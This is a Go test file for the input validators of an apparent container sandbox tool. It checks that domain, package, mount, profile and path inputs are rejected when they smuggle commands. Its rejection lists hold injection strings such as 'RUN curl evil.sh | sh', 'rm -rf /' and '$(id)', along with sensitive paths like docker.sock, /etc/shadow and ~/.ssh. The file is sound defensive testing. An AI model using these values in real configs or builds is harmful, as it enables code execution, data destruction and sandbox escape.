package security

import (
	"os"
	"path/filepath"
	"testing"
)

func TestValidateDomainAccepts(t *testing.T) {
	valid := []string{
		"api.anthropic.com",
		"github.com",
		"*.githubusercontent.com",
		"registry.npmjs.org",
		"a.b.c.d.example.com",
		"xn--80ak6aa92e.com",
		"localhost",
	}
	for _, d := range valid {
		if err := ValidateDomain(d); err != nil {
			t.Errorf("ValidateDomain(%q) = %v, want nil", d, err)
		}
	}
}

func TestValidateDomainRejectsInjection(t *testing.T) {
	// Each of these would otherwise be written verbatim into squid.conf.
	// A newline ends the acl line and lets the rest become its own directive.
	invalid := []string{
		"",
		"   ",
		"evil.com\nhttp_access allow all",
		"evil.com\rhttp_access allow all",
		"evil.com http_access allow all",
		"evil.com\x00",
		"-leading-dash.com",
		"trailing-dash-.com",
		".leading.dot.com",
		"has space.com",
		"under_score.com",
		"*.*.com",
		"*",
		"evil.com;rm -rf /",
		"evil.com\thttp_access allow all",
	}
	for _, d := range invalid {
		if err := ValidateDomain(d); err == nil {
			t.Errorf("ValidateDomain(%q) = nil, want error", d)
		}
	}
}

func TestValidateDomainLengthLimits(t *testing.T) {
	long := ""
	for len(long) < 260 {
		long += "a"
	}
	if err := ValidateDomain(long); err == nil {
		t.Error("expected error for over-long domain")
	}

	label := ""
	for len(label) < 64 {
		label += "b"
	}
	if err := ValidateDomain(label + ".com"); err == nil {
		t.Error("expected error for over-long label")
	}
}

func TestValidateProfileNameRejectsTraversal(t *testing.T) {
	// A profile name becomes a filename under ~/.config/rig/profiles, so a
	// traversing name would let an imported profile write anywhere.
	invalid := []string{
		"",
		"../escape",
		"../../etc/cron.d/evil",
		"/absolute",
		"has space",
		"has/slash",
		"has:colon",
		".hidden",
		"-leading-dash",
		"name\nnewline",
		"name\x00null",
	}
	for _, n := range invalid {
		if err := ValidateProfileName(n); err == nil {
			t.Errorf("ValidateProfileName(%q) = nil, want error", n)
		}
	}

	for _, n := range []string{"my-sandbox", "claude_dev", "a", "A1", "test-123"} {
		if err := ValidateProfileName(n); err != nil {
			t.Errorf("ValidateProfileName(%q) = %v, want nil", n, err)
		}
	}
}

func TestValidateMountSourceRejectsHostEscape(t *testing.T) {
	// Each of these would hand the sandbox control of the host.
	forbidden := []string{
		"/var/run/docker.sock",
		"/run/docker.sock",
		"/var/run/docker.sock/",
		"/var/lib/docker",
		"/var/lib/docker/volumes",
		"/proc",
		"/proc/sys",
		"/sys/fs/cgroup",
		"/dev",
		"/dev/mem",
		"/etc",
		"/etc/shadow",
		"/boot",
		"/",
		// Traversal that resolves back onto a forbidden path.
		"/var/lib/../run/docker.sock",
		"/etc/../var/run/docker.sock",
		"/home/user/../../proc/self/mem",
		"relative/path",
		"",
	}
	for _, p := range forbidden {
		if err := ValidateMountSource(p); err == nil {
			t.Errorf("ValidateMountSource(%q) = nil, want error", p)
		}
	}

	for _, p := range []string{"/home/user/code", "/srv/data", "/mnt/shared"} {
		if err := ValidateMountSource(p); err != nil {
			t.Errorf("ValidateMountSource(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidateMountTarget(t *testing.T) {
	for _, p := range []string{"", "relative", "/", "/a:b", "/a\x00b"} {
		if err := ValidateMountTarget(p); err == nil {
			t.Errorf("ValidateMountTarget(%q) = nil, want error", p)
		}
	}
	for _, p := range []string{"/home/sandbox/workspace", "/data"} {
		if err := ValidateMountTarget(p); err != nil {
			t.Errorf("ValidateMountTarget(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidatePackageNameRejectsDockerfileInjection(t *testing.T) {
	// Tool names are interpolated into a RUN line inside a backslash
	// continuation, so a newline could append its own instruction.
	invalid := []string{
		"",
		"ripgrep\nRUN curl evil.sh | sh",
		"ripgrep \\",
		"rip grep",
		"UPPERCASE",
		"pkg;rm -rf /",
		"pkg$(id)",
		"pkg`id`",
		"-leading",
	}
	for _, p := range invalid {
		if err := ValidatePackageName(p); err == nil {
			t.Errorf("ValidatePackageName(%q) = nil, want error", p)
		}
	}
	for _, p := range []string{"ripgrep", "python3-pip", "build-essential", "fd-find", "g++", "lib32z1"} {
		if err := ValidatePackageName(p); err != nil {
			t.Errorf("ValidatePackageName(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidateSize(t *testing.T) {
	for _, s := range []string{"", "10g", "512m", "1t", "2.5g", "100"} {
		if err := ValidateSize(s); err != nil {
			t.Errorf("ValidateSize(%q) = %v, want nil", s, err)
		}
	}
	for _, s := range []string{"10gb", "big", "-5g", "10g; rm -rf /", "10 g"} {
		if err := ValidateSize(s); err == nil {
			t.Errorf("ValidateSize(%q) = nil, want error", s)
		}
	}
}

func TestValidateDomainRejectsIPAddresses(t *testing.T) {
	for _, d := range []string{"127.0.0.1", "10.0.0.5", "*.192.168.1.1", "169.254.169.254"} {
		if err := ValidateDomain(d); err == nil {
			t.Errorf("ValidateDomain(%q) = nil, want error for an IP address", d)
		}
	}
}

func TestValidateNPMPackage(t *testing.T) {
	for _, p := range []string{"typescript", "@anthropic-ai/claude-code", "@scope/pkg@1.2.3", "pkg@^1.2", "pkg@~1.2.3", "pkg@latest"} {
		if err := ValidateNPMPackage(p); err != nil {
			t.Errorf("ValidateNPMPackage(%q) = %v", p, err)
		}
	}
	for _, p := range []string{"", "pkg;rm -rf /", "pkg@>=1", "pkg name", "Upper", "pkg$(id)", "../x", "pkg@1\nRUN x", "-flag"} {
		if err := ValidateNPMPackage(p); err == nil {
			t.Errorf("ValidateNPMPackage(%q) = nil, want error", p)
		}
	}
}

func TestValidatePipPackage(t *testing.T) {
	for _, p := range []string{"requests", "aider-chat", "httpx[http2]>=0.27", "Django==5.0", "pkg~=1.4", "blender-mcp"} {
		if err := ValidatePipPackage(p); err != nil {
			t.Errorf("ValidatePipPackage(%q) = %v", p, err)
		}
	}
	for _, p := range []string{"", "pkg;id", "pkg @ https://evil", "-r requirements.txt", "pkg==1 && x", "pkg\n"} {
		if err := ValidatePipPackage(p); err == nil {
			t.Errorf("ValidatePipPackage(%q) = nil, want error", p)
		}
	}
}

func TestValidateEnvName(t *testing.T) {
	for _, n := range []string{"ANTHROPIC_API_KEY", "_x", "a1"} {
		if err := ValidateEnvName(n); err != nil {
			t.Errorf("ValidateEnvName(%q) = %v", n, err)
		}
	}
	for _, n := range []string{"", "1A", "A-B", "A=B", "A B"} {
		if err := ValidateEnvName(n); err == nil {
			t.Errorf("ValidateEnvName(%q) = nil, want error", n)
		}
	}
}

func TestValidateMountSourceRejectsEngineSockets(t *testing.T) {
	for _, p := range []string{"/run/podman/podman.sock", "/run/user/1000/podman/podman.sock", "/run/user/1000/docker.sock", "/var/lib/containers/storage"} {
		if err := ValidateMountSource(p); err == nil {
			t.Errorf("ValidateMountSource(%q) = nil, want error", p)
		}
	}
	if err := ValidateMountSource("/home/user/a,b"); err == nil {
		t.Error("a comma would split a --mount spec and must be refused")
	}
}

func TestCheckCredentialPath(t *testing.T) {
	home := "/home/me"
	for _, p := range []string{"/home/me", "/home", "/home/me/.ssh", "/home/me/.ssh/id_ed25519", "/home/me/.aws", "/home/me/.config/gh", "/home/me/.config/rig/profiles", "/home/me/.docker/config.json", "/home/me/.claude", "/home/me/.codex/auth.json", "/home/me/.gemini"} {
		if err := CheckCredentialPath(p, home); err == nil {
			t.Errorf("CheckCredentialPath(%q) = nil, want error", p)
		}
	}
	for _, p := range []string{"/home/me/projects/app", "/home/me/.config/nvim", "/srv/data"} {
		if err := CheckCredentialPath(p, home); err != nil {
			t.Errorf("CheckCredentialPath(%q) = %v, want nil", p, err)
		}
	}
}

func TestResolveMountSourceFollowsSymlinks(t *testing.T) {
	dir := t.TempDir()
	home := filepath.Join(dir, "home")
	secret := filepath.Join(home, ".ssh")
	project := filepath.Join(home, "project")
	for _, d := range []string{secret, project} {
		if err := os.MkdirAll(d, 0o700); err != nil {
			t.Fatal(err)
		}
	}
	link := filepath.Join(project, "keys")
	if err := os.Symlink(secret, link); err != nil {
		t.Fatal(err)
	}
	if _, err := ResolveMountSource(link, home); err == nil {
		t.Error("a symlink into ~/.ssh must be refused once resolved")
	}
	got, err := ResolveMountSource(project, home)
	if err != nil || got == "" {
		t.Errorf("ResolveMountSource(project) = %q, %v", got, err)
	}
}

func TestValidateSubpath(t *testing.T) {
	for _, p := range []string{".github", ".git/hooks", ".env", "secrets/prod"} {
		if err := ValidateSubpath(p); err != nil {
			t.Errorf("ValidateSubpath(%q) = %v", p, err)
		}
	}
	for _, p := range []string{"", "/etc", "..", "../x", "a/../../b", ".", "a:b"} {
		if err := ValidateSubpath(p); err == nil {
			t.Errorf("ValidateSubpath(%q) = nil, want error", p)
		}
	}
}
